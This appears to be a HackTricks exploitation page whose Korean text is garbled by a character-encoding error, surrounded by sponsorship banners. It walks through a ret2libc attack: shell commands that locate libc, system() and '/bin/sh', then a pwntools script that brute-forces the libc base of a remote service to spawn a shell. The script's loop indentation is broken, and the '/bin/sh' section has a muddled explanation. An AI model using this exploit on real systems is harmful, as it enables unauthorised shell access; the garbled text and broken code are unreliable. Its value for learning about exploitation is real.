<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>


**ì·¨ì•½í•œ ì´ì§„ íŒŒì¼ì„ ì°¾ì•˜ê³  Ret2Libì„ ì‚¬ìš©í•˜ì—¬ ê³µê²©í•  ìˆ˜ ìˆë‹¤ê³  ìƒê°í•œë‹¤ë©´, ë‹¤ìŒì€ ë”°ë¥¼ ìˆ˜ ìˆëŠ” ëª‡ ê°€ì§€ ê¸°ë³¸ ë‹¨ê³„ì…ë‹ˆë‹¤.**

# **í˜¸ìŠ¤íŠ¸ ë‚´ë¶€**ì— ìˆë‹¤ë©´

## **lib**cì˜ **ì£¼ì†Œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
ASLRê°€ libcì˜ ì£¼ì†Œë¥¼ ë³€ê²½í•˜ëŠ”ì§€ í™•ì¸í•˜ë ¤ë©´ ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
```
## ì‹œìŠ¤í…œ í•¨ìˆ˜ì˜ ì˜¤í”„ì…‹ ì–»ê¸°

To exploit a binary using a return-to-libc attack, we need to know the offset of the `system` function in the target system's libc library. This offset will help us determine the address of the `system` function in memory.

To find the offset, we can use the `nm` command to list the symbols in the libc library and search for the `system` function. The offset will be the difference between the address of the `system` function and the base address of the libc library.

Here's an example command to find the offset:

```bash
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep system
```

This command will list all the symbols in the libc library and filter for the `system` function. The output will include the address of the `system` function, which we can use to calculate the offset.

Once we have the offset, we can use it in our exploit to calculate the address of the `system` function dynamically, without relying on hardcoded addresses.
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
## "/bin/sh"ì˜ ì˜¤í”„ì…‹ ì–»ê¸°

To get the offset of "/bin/sh" in the binary, we can use the following steps:

1. Find a vulnerable function or a buffer overflow vulnerability in the binary.
2. Craft a payload that overflows the buffer and overwrites the return address.
3. Use a debugger or a tool like GDB to determine the exact offset at which the return address is overwritten.
4. Calculate the offset of "/bin/sh" by subtracting the known address of the buffer from the address of "/bin/sh" in memory.

By following these steps, you can obtain the offset of "/bin/sh" and use it in your exploit.
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
## /proc/\<PID>/maps

ë§Œì•½ í”„ë¡œì„¸ìŠ¤ê°€ ë§¤ë²ˆ ëŒ€í™”í•  ë•Œë§ˆë‹¤ **ìì‹ í”„ë¡œì„¸ìŠ¤**ë¥¼ ìƒì„±í•œë‹¤ë©´ (ë„¤íŠ¸ì›Œí¬ ì„œë²„ì¸ ê²½ìš°), ì´ íŒŒì¼ì„ **ì½ì–´ë³´ì„¸ìš”** (ì•„ë§ˆë„ root ê¶Œí•œì´ í•„ìš”í•  ê²ƒì…ë‹ˆë‹¤).

ì—¬ê¸°ì—ì„œ í”„ë¡œì„¸ìŠ¤ ë‚´ë¶€ì— **libcê°€ ì •í™•íˆ ì–´ë””ì— ë¡œë“œë˜ì–´ ìˆëŠ”ì§€**ì™€ í”„ë¡œì„¸ìŠ¤ì˜ ëª¨ë“  ìì‹ë“¤ì´ ë¡œë“œë  ìœ„ì¹˜ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (95).png>)

ì´ ê²½ìš°ì—ëŠ” **0xb75dc000**ì— ë¡œë“œë˜ì–´ ìˆìŠµë‹ˆë‹¤ (ì´ê²ƒì´ libcì˜ ê¸°ë³¸ ì£¼ì†Œê°€ ë  ê²ƒì…ë‹ˆë‹¤).

## gdb-peda ì‚¬ìš©í•˜ê¸°

gdb-pedaë¥¼ ì‚¬ìš©í•˜ì—¬ **system** í•¨ìˆ˜, **exit** í•¨ìˆ˜ ë° **"/bin/sh"** ë¬¸ìì—´ì˜ ì£¼ì†Œë¥¼ ì–»ìœ¼ì„¸ìš”:
```
p system
p exit
find "/bin/sh"
```
# ASLR ìš°íšŒí•˜ê¸°

libcì˜ ê¸°ì € ì£¼ì†Œë¥¼ ë¬´ì°¨ë³„ ëŒ€ì…(bruteforce)í•˜ì—¬ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
# ì½”ë“œ
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()    #Banner

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive() #?
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
